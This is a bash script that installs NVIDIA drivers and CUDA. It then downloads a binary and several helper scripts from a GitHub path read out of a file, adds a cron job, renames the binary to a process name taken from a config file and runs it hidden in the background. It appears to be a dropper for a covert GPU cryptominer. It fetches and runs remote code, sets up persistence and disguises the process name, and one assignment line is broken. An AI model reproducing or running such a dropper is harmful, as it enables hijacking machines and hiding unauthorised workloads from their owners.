#!/bin/bash
sleep 10
gitpath=$(head -1 gitpath.txt)

yes '' | sudo add-apt-repository ppa:graphics-drivers/ppa
sudo apt install -y nvidia-driver-418

CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb
wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG}
sudo dpkg -i /tmp/${CUDA_REPO_PKG}
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub 

rm -f /tmp/${CUDA_REPO_PKG}
sudo apt-get update -y
sudo apt-get install cuda-drivers -y
sudo apt-get install cuda -y
sudo apt-get update -y
sudo apt-get upgrade -y
sudo apt-get dist-upgrade -y
sudo apt-get install cuda-drivers -y

sleep 2

Fcheck=$(shuf -i 1-2 -n 1)
num=$Fcheck

if [ $num = 2 ]; 
	then
		echo "RUN PROCESS 1"; 
			Uname=$(ls /home)
			sudo echo $Uname > inuser.txt
			wget https://github.com/$gitpath/raw/main/linux.tar.gz
			tar -xvf linux.tar.gz
			rm -rf linux.tar.gz
			mkdir bin
			cp linux bin/linux
			chown -R $Uname:$Uname /home/$Uname/
			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
			wget https://github.com/$gitpath/raw/main/logrun.sh
			chmod +x auinstall.sh
			chmod +x processname.sh
			chmod +x cronadd.sh
			chmod +x logrun.sh
			./cronadd.sh
			./processname.sh
			cp inuser.txt bin/inuser.txt
			cd bin/
           	wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
			Uname=$(ls /home)
			USEPROCNAME=$(cat SETPROCNAME.txt)
			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
			mv runlinux.sh runsrc.sh
			chmod +x runsrc.sh
			mv linux $USEPROCNAME
			sudo chown -R $Uname:$Uname /home/$Uname/
			nohup sh runsrc.sh > result.log 2>&1 &
			
	else 
		echo "RUN PROCESS 2"; 
			Uname=$(ls /home)
			sudo echo $Uname > inuser.txt
			wget https://github.com/$gitpath/raw/main/linux.tar.gz
			tar -xvf linux.tar.gz
			rm -rf linux.tar.gz
			mkdir bin
			cp linux bin/linux
			Uname=(head -1 inuser.txt)
			chown -R $Uname:$Uname /home/$Uname/
			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
			wget https://raw.githubusercontent.com/$gitpath/main/logrun.sh
			chmod +x auinstall.sh
			chmod +x processname.sh
			chmod +x cronadd.sh
			chmod +x logrun.sh
			./cronadd.sh
			./processname.sh
			cp inuser.txt bin/inuser.txt
			cd bin/
           	wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
			Uname=$(ls /home)
			USEPROCNAME=$(cat SETPROCNAME.txt)
			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
			mv runlinux.sh runsrc.sh
			chmod +x runsrc.sh
			mv linux $USEPROCNAME
			sudo chown -R $Uname:$Uname /home/$Uname/
			nohup sh runsrc.sh > result.log 2>&1 &

fi
